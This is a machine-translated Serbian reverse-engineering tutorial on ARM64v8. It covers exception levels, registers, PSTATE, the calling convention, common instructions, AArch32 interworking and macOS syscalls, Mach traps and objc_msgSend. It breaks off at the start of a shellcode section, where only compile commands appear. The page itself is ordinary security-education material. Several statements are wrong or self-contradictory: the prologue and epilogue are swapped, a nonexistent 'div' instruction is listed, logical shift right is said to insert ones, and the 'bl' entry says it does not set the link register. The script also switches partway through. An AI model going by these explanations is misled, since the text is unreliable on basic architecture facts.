# Увод у ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Нивои Изузећа - EL (ARM64v8)**

У ARMv8 архитектури, нивои изузећа, познати као Нивои Изузећа (ELs), дефинишу ниво привилегија и способности извршног окружења. Постоје четири нивоа изузећа, од EL0 до EL3, од којих сваки служи различитој сврси:

1. **EL0 - Кориснички Режим**:
- Ово је најмање привилегован ниво и користи се за извршавање редовног кода апликација.
- Апликације које раде на EL0 су изоловане једна од друге и од системског софтвера, што побољшава безбедност и стабилност.
2. **EL1 - Режим Језгра Оперативног Система**:
- Већина језгара оперативних система ради на овом нивоу.
- EL1 има више привилегија од EL0 и може приступити системским ресурсима, али уз нека ограничења ради очувања интегритета система.
3. **EL2 - Режим Хипервизора**:
- Овај ниво се користи за виртуализацију. Хипервизор који ради на EL2 може управљати више оперативних система (сваки у свом EL1) који раде на истом физичком хардверу.
- EL2 пружа функције за изолацију и контролу виртуализованих окружења.
4. **EL3 - Режим Сигурног Монитора**:
- Ово је најпривилегованији ниво и често се користи за сигурно покретање и окружења за поверење.
- EL3 може управљати и контролисати приступе између сигурних и несигурних стања (као што су сигурно покретање, поверење ОС, итд.).

Користење ових нивоа омогућава структурисан и сигуран начин управљања различитим аспектима система, од корисничких апликација до најпривилегованијег системског софтвера. Приступ ARMv8 нивима привилегија помаже у ефикасном изоловању различитих компоненти система, чиме се побољшава безбедност и робусност система.

## **Регистри (ARM64v8)**

ARM64 има **31 регистар опште намене**, обележен `x0` до `x30`. Сваки може да чува **64-битну** (8-бајтну) вредност. За операције које захтевају само 32-битне вредности, исти регистри могу бити доступни у 32-битном режиму користећи имена w0 до w30.

1. **`x0`** до **`x7`** - Ови се обично користе као регистри за привремене податке и за пренос параметара у подпрограме.
- **`x0`** такође носи повратне податке функције
2. **`x8`** - У Линукс језгру, `x8` се користи као број системског позива за `svc` инструкцију. **У macOS, x16 је тај који се користи!**
3. **`x9`** до **`x15`** - Више привремених регистара, често се користе за локалне променљиве.
4. **`x16`** и **`x17`** - **Регистри за позиве унутар процедура**. Привремени регистри за одмах вредности. Такође се користе за индиректне позиве функција и PLT (Табела повезивања процедура).
- **`x16`** се користи као **број системског позива** за **`svc`** инструкцију у **macOS**.
5. **`x18`** - **Регистар платформе**. Може се користити као регистар опште намене, али на неким платформама, овај регистар је резервисан за платформски специфичне намене: Показивач на блок окружења тренутне нити у Виндовсу, или за указивање на тренутну **структуру извршавања задатка у језгру линукса**.
6. **`x19`** до **`x28`** - Ово су регистри које чува позвана функција. Функција мора да сачува вредности ових регистара за свог позиваоца, тако да се чувају на стеку и опорављају пре него што се врати позиваоцу.
7. **`x29`** - **Показивач оквира** за праћење оквира стека. Када се креира нови оквир стека јер је функција позвана, **`x29`** регистар се **чува на стеку** и **нова** адреса показивача оквира (**`sp`** адреса) се **чува у овом регистру**.
- Овај регистар се такође може користити као **регистар опште намене** иако се обично користи као референца за **локалне променљиве**.
8. **`x30`** или **`lr`**- **Регистар за везу**. Држи **повратну адресу** када се извршава `BL` (Гранка са везом) или `BLR` (Гранка са везом на регистар) инструкција чувајући **`pc`** вредност у овом регистру.
- Може се користити и као било који други регистар.
- Ако тренутна функција позива нову функцију и стога преоптерећује `lr`, чуваће је на стеку на почетку, ово је епилог (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Сачувај `fp` и `lr`, генериши простор и добиј нови `fp`) и опоравиће је на крају, ово је пролог (`ldp x29, x30, [sp], #48; ret` -> Опорави `fp` и `lr` и врати се).
9. **`sp`** - **Показивач стека**, користи се за праћење врха стека.
- Вредност **`sp`** треба увек да буде одржавана на најмање **квадричну** **поредак** или може доћи до изузећа у поретку.
10. **`pc`** - **Бројач програма**, који указује на следећу инструкцију. Овај регистар може бити ажуриран само кроз генерисање изузећа, повратке изузећа и гране. Једине обичне инструкције које могу читати овај регистар су гране са везом (BL, BLR) да би се сачувала **`pc`** адреса у **`lr`** (Регистар за везу).
11. **`xzr`** - **Нулти регистар**. Такође се зове **`wzr`** у његовом **32**-битном регистарном облику. Може се користити за лако добијање нулте вредности (обична операција) или за извршавање поређења користећи **`subs`** као **`subs XZR, Xn, #10`** чувајући резултујуће податке нигде (у **`xzr`**).

Регистри **`Wn`** су **32-битна** верзија регистара **`Xn`**.

### SIMD и Регистри за Плутајућу Тачку

Штавише, постоји још **32 регистра дужине 128бит** који се могу користити у оптимизованим операцијама са једном инструкцијом за више података (SIMD) и за извршавање аритметике плутајуће тачке. Ови се зову Vn регистри иако могу радити и у **64**-битном, **32**-битном, **16**-битном и **8**-битном режиму и тада се зову **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** и **`Bn`**.

### Системски Регистри

**Постоје стотине системских регистара**, такође познатих као регистри специјалне намене (SPRs), који се користе за **праћење** и **контролу** понашања **процесора**.\
Могу се читати или постављати само користећи посебне инструкције **`mrs`** и **`msr`**.

Посебни регистри **`TPIDR_EL0`** и **`TPIDDR_EL0`** се често налазе током реверзног инжењеринга. Сuffix `EL0` указује на **минимално изузеће** из ког се регистар може приступити (у овом случају EL0 је редован ниво изузећа (привилегија) на коме редовни програми раде).\
Често се користе за чување **основне адресе региона локалне меморије**. Обично је први читљив и записив за програме који раде у EL0, али други се може читати из EL0 и писати из EL1 (као језгро).

- `mrs x0, TPIDR_EL0 ; Читај TPIDR_EL0 у x0`
- `msr TPIDR_EL0, X0 ; Запиши x0 у TPIDR_EL0`

### **PSTATE**

**PSTATE** садржи неколико компоненти процеса серијализованих у регистру **`SPSR_ELx`** видљивом за оперативни систем, где је X **ниво** **дозволе** **изазваног** изузећа (ово омогућава опоравак стања процеса када изузеће заврши).\
Ово су доступна поља:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** и **`V`** условне заставице:
- **`N`** значи да је операција дала негативан резултат
- **`Z`** значи да је операција дала нулу
- **`C`** значи да је операција пренела
- **`V`** значи да је операција дала потписано преливање:
- Збир две позитивне бројеве даје негативан резултат.
- Збир два негативна броја даје позитиван резултат.
- У одузимању, када се велики негативан број одузме од мањег позитивног броја (или обрнуто), а резултат не може бити представљен у опсегу дате величине бита.
- Очигледно, процесор не зна да ли је операција потписана или не, па ће проверити C и V у операцијама и указати да ли је дошло до преноса у случају да је било потписано или непотписано.

> [!WARNING]
> Нису све инструкције ажурирале ове заставице. Неке као **`CMP`** или **`TST`** то раде, а друге које имају s суфикс као **`ADDS`** такође то раде.

- Тренутна **заставица ширине регистра (`nRW`)**: Ако застава држи вредност 0, програм ће се извршавати у AArch64 извршном стању када се поново покрене.
- Тренутни **Ниво Изузећа** (**`EL`**): Редован програм који ради у EL0 ће имати вредност 0
- **Заставица појединачног корака** (**`SS`**): Користи се од стране дебагера за појединачно корачање постављајући SS заставицу на 1 унутар **`SPSR_ELx`** кроз изузеће. Програм ће извршити корак и издаће изузеће појединачног корака.
- **Заставица нелегалног изузећа** (**`IL`**): Користи се за означавање када привилегисани софтвер изврши неважећи пренос нивоа изузећа, ова застава се поставља на 1 и процесор активира нелегално стање изузећа.
- **`DAIF`** заставице: Ове заставице омогућавају привилегисаном програму да селективно маскира одређена спољна изузећа.
- Ако је **`A`** 1, то значи да ће бити активирани **асинхрони прекиди**. **`I`** конфигурише одговор на спољне хардверске **Захтеве за прекид** (IRQ). и F се односи на **Брзе захтеве за прекид** (FIR).
- **Заставице избора показивача стека** (**`SPS`**): Привилегисани програми који раде у EL1 и изнад могу да прелазе између коришћења свог регистара показивача стека и корисничког модела (нпр. између `SP_EL1` и `EL0`). Ово прелазак се изводи писањем у посебан регистар **`SPSel`**. Ово не може бити учињено из EL0.

## **Конвенција Позивања (ARM64v8)**

ARM64 конвенција позивања спецификује да се **првих осам параметара** функцији преноси у регистрима **`x0` до `x7`**. **Додатни** параметри се преносе на **стеку**. **Вредност** повратка се враћа у регистар **`x0`**, или у **`x1`** такође **ако је 128 битна**. Регистри **`x19`** до **`x30`** и **`sp`** морају бити **очувани** током позива функција.

Када читате функцију у асемблеру, потражите **пролог и епилог функције**. **Пролог** обично укључује **чување показивача оквира (`x29`)**, **постављање** новог **показивача оквира**, и **алокацију простора на стеку**. **Епилог** обично укључује **враћање сачуваног показивача оквира** и **враћање** из функције.

### Конвенција Позивања у Swift

Swift има своју **конвенцију позивања** која се може наћи у [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Обичне Инструкције (ARM64v8)**

ARM64 инструкције обично имају **формат `opcode dst, src1, src2`**, где је **`opcode`** **операција** која се извршава (као што су `add`, `sub`, `mov`, итд.), **`dst`** је **регистар одредишта** где ће резултат бити сачуван, а **`src1`** и **`src2`** су **регистри извора**. Одмах вредности се такође могу користити уместо регистара извора.

- **`mov`**: **Премести** вредност из једног **регистра** у други.
- Пример: `mov x0, x1` — Ово премешта вредност из `x1` у `x0`.
- **`ldr`**: **Учитај** вредност из **меморије** у **регистар**.
- Пример: `ldr x0, [x1]` — Ово учитава вредност из меморијске локације на коју указује `x1` у `x0`.
- **Режим офсет**: Офсет који утиче на оригинални показивач је назначен, на пример:
- `ldr x2, [x1, #8]`, ово ће учитати у x2 вредност из x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, ово ће учитати у x2 објекат из низа x0, из позиције x1 (индекс) \* 4
- **Режим пред-индикатора**: Ово ће применити израчунавања на оригинал, добити резултат и такође сачувати нови оригинал у оригиналу.
- `ldr x2, [x1, #8]!`, ово ће учитати `x1 + 8` у `x2` и сачувати у x1 резултат `x1 + 8`
- `str lr, [sp, #-4]!`, Сачувај регистар везе у sp и ажурирај регистар sp
- **Режим пост-индикатора**: Ово је као претходни, али се меморијска адреса приступа и затим се офсет израчунава и чува.
- `ldr x0, [x1], #8`, учитај `x1` у `x0` и ажурирај x1 са `x1 + 8`
- **PC-релативно адресирање**: У овом случају адреса за учитавање се израчунава релативно на PC регистар
- `ldr x1, =_start`, Ово ће учитати адресу где симбол `_start` почиње у x1 у односу на тренутни PC.
- **`str`**: **Сачувај** вредност из **регистра** у **меморију**.
- Пример: `str x0, [x1]` — Ово чува вредност у `x0` у меморијској локацији на коју указује `x1`.
- **`ldp`**: **Учитај пар регистара**. Ова инструкција **учитава два регистра** из **узастопних меморијских** локација. Меморијска адреса се обично формира додавањем офсета вредности у другом регистру.
- Пример: `ldp x0, x1, [x2]` — Ово учитава `x0` и `x1` из меморијских локација на `x2` и `x2 + 8`, респективно.
- **`stp`**: **Сачувај пар регистара**. Ова инструкција **сачува два регистра** у **узастопне меморијске** локације. Меморијска адреса се обично формира додавањем офсета вредности у другом регистру.
- Пример: `stp x0, x1, [sp]` — Ово чува `x0` и `x1` у меморијским локацијама на `sp` и `sp + 8`, респективно.
- `stp x0, x1, [sp, #16]!` — Ово чува `x0` и `x1` у меморијским локацијама на `sp+16` и `sp + 24`, респективно, и ажурира `sp` са `sp+16`.
- **`add`**: **Додај** вредности два регистра и сачувај резултат у регистру.
- Синтакса: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Одредиште
- Xn2 -> Операнд 1
- Xn3 | #imm -> Операнд 2 (регистар или одмах)
- \[shift #N | RRX] -> Изврши померање или позови RRX
- Пример: `add x0, x1, x2` — Ово додаје вредности у `x1` и `x2` и чува резултат у `x0`.
- `add x5, x5, #1, lsl #12` — Ово је једнако 4096 (1 померач 12 пута) -> 1 0000 0000 0000 0000
- **`adds`** Ово извршава `add` и ажурира заставице
- **`sub`**: **Одузми** вредности два регистра и сачувај резултат у регистру.
- Проверите **`add`** **синтаксу**.
- Пример: `sub x0, x1, x2` — Ово одузима вредност у `x2` од `x1` и чува резултат у `x0`.
- **`subs`** Ово је као sub али ажурира заставицу
- **`mul`**: **Множење** вредности **две регистре** и чува резултат у регистру.
- Пример: `mul x0, x1, x2` — Ово множе вредности у `x1` и `x2` и чува резултат у `x0`.
- **`div`**: **Дели** вредност једног регистра са другим и чува резултат у регистру.
- Пример: `div x0, x1, x2` — Ово дели вредност у `x1` са `x2` и чува резултат у `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Логичко померање налево**: Додајте 0 из краја померајући остале битове напред (множите са n-пута 2)
- **Логичко померање удесно**: Додајте 1 на почетку померајући остале битове уназад (делите са n-пута 2 у непотписаним)
- **Аритметичко померање удесно**: Као **`lsr`**, али уместо додавања 0, ако је најзначајнији бит 1, **додају се 1** (\*\*делите са ntimes 2 у потписаним)
- **Померите удесно**: Као **`lsr`** али шта год да се уклони с десне стране, додаје се с леве
- **Померите удесно са проширењем**: Као **`ror`**, али са заставицом преноса као "најзначајнији бит". Дакле, заставица преноса се помера на бит 31, а уклоњени бит у заставицу преноса.
- **`bfm`**: **Премештање битова**, ове операције **копирају битове `0...n`** из вредности и стављају их у позиције **`m..m+n`**. **`#s`** одређује **леви бит** позицију, а **`#r`** количину померања удесно.
- Премештање битова: `BFM Xd, Xn, #r`
- Потписано премештање битова: `SBFM Xd, Xn, #r, #s`
- Непотписано премештање битова: `UBFM Xd, Xn, #r, #s`
- **Извлачење и уметање битова:** Копира битно поље из регистра и копира га у други регистар.
- **`BFI X1, X2, #3, #4`** Уметни 4 бита из X2 из 3. бита X1
- **`BFXIL X1, X2, #3, #4`** Извлачи из 3. бита X2 четири бита и копира их у X1
- **`SBFIZ X1, X2, #3, #4`** Потписује 4 бита из X2 и уметне их у X1 почињући на позицији бита 3 нулирајући десне битове
- **`SBFX X1, X2, #3, #4`** Извлачи 4 бита почињући на биту 3 из X2, потписује их и ставља резултат у X1
- **`UBFIZ X1, X2, #3, #4`** Нулира 4 бита из X2 и уметне их у X1 почињући на позицији бита 3 нулирајући десне битове
- **`UBFX X1, X2, #3, #4`** Извлачи 4 бита почињући на биту 3 из X2 и ставља нулирани резултат у X1.
- **Потписно проширење на X:** Проширење потписа (или само додавање 0 у непотписаној верзији) вредности да би се могле извршавати операције с њом:
- **`SXTB X1, W2`** Проширење потписа байта **из W2 у X1** (`W2` је половина `X2`) да попуни 64 бита
- **`SXTH X1, W2`** Проширење потписа 16-битног броја **из W2 у X1** да попуни 64 бита
- **`SXTW X1, W2`** Проширење потписа байта **из W2 у X1** да попуни 64 бита
- **`UXTB X1, W2`** Додаје 0 (непотписано) на байт **из W2 у X1** да попуни 64 бита
- **`extr`:** Извлачи битове из одређеног **пара регистара конкатенованих**.
- Пример: `EXTR W3, W2, W1, #3` Ово ће **конкатеновати W1+W2** и добити **од бита 3 W2 до бита 3 W1** и сачувати у W3.
- **`cmp`**: **Поређење** два регистра и постављање условних заставица. То је **алиас `subs`** постављајући регистар одредишта на регистар нуле. Корисно за проверу да ли `m == n`.
- Подржава **исту синтаксу као `subs`**
- Пример: `cmp x0, x1` — Ово пореди вредности у `x0` и `x1` и поставља условне заставице у складу с тим.
- **`cmn`**: **Поређење негативног** операнда. У овом случају је **алиас `adds`** и подржава исту синтаксу. Корисно за проверу да ли `m == -n`.
- **`ccmp`**: Условно поређење, то је поређење које ће бити извршено само ако је претходно поређење било тачно и конкретно ће поставити nzcv битове.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ако x1 != x2 и x3 < x4, скочи на func
- Ово је зато што **`ccmp`** ће бити извршено само ако је **претходни `cmp` био `NE`**, ако није, битови `nzcv` ће бити постављени на 0 (што неће задовољити `blt` поређење).
- Ово се може користити и као `ccmn` (исто али негативно, као `cmp` против `cmn`).
- **`tst`**: Проверава да ли су било које од вредности поређења обе 1 (ради као ANDS без чувања резултата било где). Корисно је проверити регистар са вредношћу и проверити да ли је било који од битова регистра назначених у вредности 1.
- Пример: `tst X1, #7` Проверава да ли је било који од последња 3 бита X1 1
- **`teq`**: XOR операција без чувања резултата
- **`b`**: Безусловна грана
- Пример: `b myFunction`
- Имајте на уму да ово неће попунити регистар везе са повратном адресом (није прикладно за позиве подпрограма који треба да се врате)
- **`bl`**: **Гранка** са везом, користи се за **позив** **подпрограма**. Чува **повратну адресу у `x30`**.
- Пример: `bl myFunction` — Ово позива функцију `myFunction` и чува повратну адресу у `x30`.
- Имајте на уму да ово неће попунити регистар везе са повратном адресом (није прикладно за позиве подпрограма који треба да се врате)
- **`blr`**: **Гранка** са везом на регистар, користи се за **позив** **подпрограма** где је циљ **наведен** у **регистру**. Чува повратну адресу у `x30`. (Ово је
- Пример: `blr x1` — Ово позива функцију чија адреса је садржана у `x1` и чува повратну адресу у `x30`.
- **`ret`**: **Врати се** из **подпрограма**, обично користећи адресу у **`x30`**.
- Пример: `ret` — Ово се враћа из тренутног подпрограма користећи повратну адресу у `x30`.
- **`b.<cond>`**: Условне гране
- **`b.eq`**: **Гранка ако је једнако**, на основу претходне `cmp` инструкције.
- Пример: `b.eq label` — Ако је претходна `cmp` инструкција пронашла две једнаке вредности, ово скочи на `label`.
- **`b.ne`**: **Гранка ако није једнако**. Ова инструкција проверава условне заставице (које су постављене претходном инструкцијом поређења), и ако поређене вредности нису једнаке, грана на ознаку или адресу.
- Пример: Након `cmp x0, x1` инструкције, `b.ne label` — Ако вредности у `x0` и `x1` нису једнаке, ово скочи на `label`.
- **`cbz`**: **Поређење и гранање на нулу**. Ова инструкција пореди регистар са нулом, и ако су једнаке, грана на ознаку или адресу.
- Пример: `cbz x0, label` — Ако је вредност у `x0` нула, ово скочи на `label`.
- **`cbnz`**: **Поређење и гранање на ненуло**. Ова инструкција пореди регистар са нулом, и ако нису једнаке, грана на ознаку или адресу.
- Пример: `cbnz x0, label` — Ако је вредност у `x0` ненула, ово скочи на `label`.
- **`tbnz`**: Тестирај бит и гранај на ненуло
- Пример: `tbnz x0, #8, label`
- **`tbz`**: Тестирај бит и гранај на нулу
- Пример: `tbz x0, #8, label`
- **Условне операције избора**: Ово су операције чије понашање варира у зависности од условних битова.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ако је тачно, X0 = X1, ако није, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ако је тачно, Xd = Xn, ако није, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ако је тачно, Xd = Xn + 1, ако није, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ако је тачно, Xd = Xn, ако није, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ако је тачно, Xd = NOT(Xn), ако није, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ако је тачно, Xd = Xn, ако није, Xd = - Xm
- `cneg Xd, Xn, cond` -> Ако је тачно, Xd = - Xn, ако није, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ако је тачно, Xd = 1, ако није, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ако је тачно, Xd = \<сви 1>, ако није, Xd = 0
- **`adrp`**: Израчунајте **адресу странице симбола** и сачувајте је у регистру.
- Пример: `adrp x0, symbol` — Ово израчунава адресу странице симбола `symbol` и чува је у `x0`.
- **`ldrsw`**: **Учитајте** потписану **32-битну** вредност из меморије и **потписно проширите на 64** бита.
- Пример: `ldrsw x0, [x1]` — Ово учитава потписану 32-битну вредност из меморијске локације на коју указује `x1`, потписно је проширује на 64 бита и чува у `x0`.
- **`stur`**: **Сачувајте вредност регистра на меморијској локацији**, користећи офсет из другог регистра.
- Пример: `stur x0, [x1, #4]` — Ово чува вредност у `x0` у меморијској адреси која је 4 бајта већа од адресе која се тренутно налази у `x1`.
- **`svc`** : Изврши **системски позив**. Ово значи "Позив супервизора". Када процесор извршава ову инструкцију, **прелази из корисничког режима у режим језгра** и скочи на одређену локацију у меморији где се налази **код за обраду системских позива језгра**.

- Пример:

```armasm
mov x8, 93  ; Учитај број системског позива за излаз (93) у регистар x8.
mov x0, 0   ; Учитај код статуса излаза (0) у регистар x0.
svc 0       ; Изврши системски позив.
```

### **Пролог Функције**

1. **Сачувајте регистар везе и показивач оквира на стеку**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Postavite novi pokazivač okvira**: `mov x29, sp` (postavlja novi pokazivač okvira za trenutnu funkciju)  
3. **Dodelite prostor na steku za lokalne promenljive** (ako je potrebno): `sub sp, sp, <size>` (gde je `<size>` broj bajtova koji su potrebni)  

### **Epilog funkcije**

1. **Dealokacija lokalnih promenljivih (ako su neke dodeljene)**: `add sp, sp, <size>`  
2. **Obnovite registrator veze i pokazivač okvira**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (vraća kontrolu pozivaocu koristeći adresu u link registru)

## AARCH32 Izvršni Stanje

Armv8-A podržava izvršavanje 32-bitnih programa. **AArch32** može raditi u jednom od **dva skupa instrukcija**: **`A32`** i **`T32`** i može prebacivati između njih putem **`interworking`**.\
**Privilegovani** 64-bitni programi mogu zakazati **izvršavanje 32-bitnih** programa izvršavanjem prenosa nivoa izuzetka na niže privilegovane 32-bitne.\
Napomena: prelazak sa 64-bitnog na 32-bitni se dešava sa smanjenjem nivoa izuzetka (na primer, 64-bitni program u EL1 pokreće program u EL0). Ovo se postiže postavljanjem **bita 4** **`SPSR_ELx`** specijalnog registra **na 1** kada je `AArch32` procesni nit spreman za izvršavanje, a ostatak `SPSR_ELx` čuva **`AArch32`** programe CPSR. Zatim, privilegovani proces poziva **`ERET`** instrukciju tako da procesor prelazi na **`AArch32`** ulazeći u A32 ili T32 u zavisnosti od CPSR\*\*.\*\*

**`Interworking`** se dešava korišćenjem J i T bitova CPSR. `J=0` i `T=0` znači **`A32`** i `J=0` i `T=1` znači **T32**. Ovo se u suštini prevodi na postavljanje **najnižeg bita na 1** da označi da je skup instrukcija T32.\
Ovo se postavlja tokom **interworking grana instrukcija,** ali se takođe može postaviti direktno sa drugim instrukcijama kada je PC postavljen kao registar odredišta. Primer:

Još jedan primer:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registar

Postoji 16 32-bitnih registara (r0-r15). **Od r0 do r14** mogu se koristiti za **bilo koju operaciju**, međutim neki od njih su obično rezervisani:

- **`r15`**: Program counter (uvek). Sadrži adresu sledeće instrukcije. U A32 trenutni + 8, u T32, trenutni + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer
- **`r14`**: Link Register

Pored toga, registri su podržani u **`banked registries`**. To su mesta koja čuvaju vrednosti registara, omogućavajući **brzo prebacivanje konteksta** u obradi izuzetaka i privilegovanih operacija kako bi se izbegla potreba za ručnim čuvanjem i obnavljanjem registara svaki put.\
To se postiže **čuvanjem stanja procesora iz `CPSR` u `SPSR`** režima procesora u kojem se izuzetak dešava. Kada se izuzetak vrati, **`CPSR`** se obnavlja iz **`SPSR`**.

### CPSR - Registar trenutnog statusa programa

U AArch32 CPSR funkcioniše slično **`PSTATE`** u AArch64 i takođe se čuva u **`SPSR_ELx`** kada se izuzetak dešava kako bi se kasnije obnovila izvršavanje:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Polja su podeljena u nekoliko grupa:

- Registar statusa aplikacionog programa (APSR): Aritmetičke zastavice i dostupne iz EL0
- Registar stanja izvršenja: Ponašanje procesa (upravlja OS).

#### Registar statusa aplikacionog programa (APSR)

- Zastavice **`N`**, **`Z`**, **`C`**, **`V`** (poput AArch64)
- Zastavica **`Q`**: Postavlja se na 1 kada **dođe do saturacije celih brojeva** tokom izvršavanja specijalizovane aritmetičke instrukcije. Kada se postavi na **`1`**, zadržaće tu vrednost dok se ručno ne postavi na 0. Pored toga, ne postoji nijedna instrukcija koja implicitno proverava njenu vrednost, to se mora uraditi čitanjem ručno.
- Zastavice **`GE`** (Veće ili jednako): Koriste se u SIMD (Jedna instrukcija, više podataka) operacijama, kao što su "paralelno sabiranje" i "paralelno oduzimanje". Ove operacije omogućavaju obradu više tačaka podataka u jednoj instrukciji.

Na primer, instrukcija **`UADD8`** **sabira četiri para bajtova** (iz dva 32-bitna operanda) paralelno i čuva rezultate u 32-bitnom registru. Zatim **postavlja `GE` zastavice u `APSR`** na osnovu ovih rezultata. Svaka GE zastavica odgovara jednom od sabiranja bajtova, ukazujući da li je sabiranje za taj par bajtova **prelilo**.

Instrukcija **`SEL`** koristi ove GE zastavice za izvođenje uslovnih akcija.

#### Registri stanja izvršenja

- Bitovi **`J`** i **`T`**: **`J`** treba da bude 0, a ako je **`T`** 0 koristi se skup instrukcija A32, a ako je 1, koristi se T32.
- **IT Block State Register** (`ITSTATE`): Ovo su bitovi od 10-15 i 25-26. Čuvaju uslove za instrukcije unutar grupe sa prefiksom **`IT`**.
- Bit **`E`**: Ukazuje na **endianness**.
- Bitovi za režim i masku izuzetaka (0-4): Određuju trenutno stanje izvršenja. **5.** označava da li program radi kao 32bit (1) ili 64bit (0). Ostala 4 predstavljaju **režim izuzetka koji se trenutno koristi** (kada dođe do izuzetka i on se obrađuje). Broj postavljen **ukazuje na trenutni prioritet** u slučaju da se drugi izuzetak pokrene dok se ovaj obrađuje.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Određeni izuzeci mogu biti onemogućeni korišćenjem bitova **`A`**, `I`, `F`. Ako je **`A`** 1, to znači da će **asinkroni aborti** biti pokrenuti. **`I`** konfiguriše odgovor na spoljne hardverske **Interrupts Requests** (IRQs). a F se odnosi na **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Pogledajte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD syscalls će imati **x16 > 0**.

### Mach Traps

Pogledajte u [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) `mach_trap_table` i u [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototipove. Maksimalni broj Mach traps je `MACH_TRAP_TABLE_COUNT` = 128. Mach traps će imati **x16 < 0**, tako da treba da pozovete brojeve iz prethodne liste sa **minusom**: **`_kernelrpc_mach_vm_allocate_trap`** je **`-10`**.

Takođe možete proveriti **`libsystem_kernel.dylib`** u disassembleru da biste saznali kako da pozovete ove (i BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Napomena da **Ida** i **Ghidra** takođe mogu dekompilirati **specifične dylibs** iz keša jednostavno prolazeći kroz keš.

> [!TIP]
> Ponekad je lakše proveriti **dekompilirani** kod iz **`libsystem_kernel.dylib`** **nego** proveravati **izvorni kod** jer se kod nekoliko syscalls (BSD i Mach) generiše putem skripti (proverite komentare u izvoru) dok u dylib-u možete pronaći šta se poziva.

### machdep pozivi

XNU podržava još jedan tip poziva koji se naziva zavistan od mašine. Broj ovih poziva zavisi od arhitekture i ni pozivi ni brojevi nisu garantovani da ostanu konstantni.

### comm stranica

Ovo je stranica memorije vlasnika kernela koja je mapirana u adresni prostor svakog korisničkog procesa. Namenjena je da ubrza prelazak iz korisničkog moda u kernel prostor brže nego korišćenje syscalls za kernel usluge koje se toliko koriste da bi ovaj prelazak bio veoma neefikasan.

Na primer, poziv `gettimeofdate` čita vrednost `timeval` direktno sa comm stranice.

### objc_msgSend

Veoma je uobičajeno pronaći ovu funkciju korišćenu u Objective-C ili Swift programima. Ova funkcija omogućava pozivanje metode objekta Objective-C.

Parametri ([više informacija u dokumentaciji](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pokazivač na instancu
- x1: op -> Selektor metode
- x2... -> Ostatak argumenata pozvane metode

Dakle, ako stavite breakpoint pre grananja ka ovoj funkciji, možete lako pronaći šta se poziva u lldb sa (u ovom primeru objekat poziva objekat iz `NSConcreteTask` koji će izvršiti komandu):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Postavljanjem env varijable **`NSObjCMessageLoggingEnabled=1`** moguće je logovati kada se ova funkcija poziva u datoteci kao što je `/tmp/msgSends-pid`.
>
> Pored toga, postavljanjem **`OBJC_HELP=1`** i pozivanjem bilo kog binarnog fajla možete videti druge varijable okruženja koje možete koristiti da **log** kada se određene Objc-C akcije dešavaju.

Kada se ova funkcija pozove, potrebno je pronaći pozvanu metodu označene instance, za to se vrše različite pretrage:

- Izvršiti optimističku pretragu u kešu:
- Ako je uspešno, gotovo
- Zauzeti runtimeLock (čitanje)
- Ako (realizuj && !cls->realized) realizuj klasu
- Ako (inicijalizuj && !cls->initialized) inicijalizuj klasu
- Pokušaj keš vlastite klase:
- Ako je uspešno, gotovo
- Pokušaj listu metoda klase:
- Ako je pronađeno, popuni keš i gotovo
- Pokušaj keš nadklase:
- Ako je uspešno, gotovo
- Pokušaj listu metoda nadklase:
- Ako je pronađeno, popuni keš i gotovo
- Ako (resolver) pokušaj metod resolver, i ponovi od pretrage klase
- Ako si još ovde (= sve ostalo je propalo) pokušaj forwarder

### Shellcodes

Da bi se kompajlirao:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
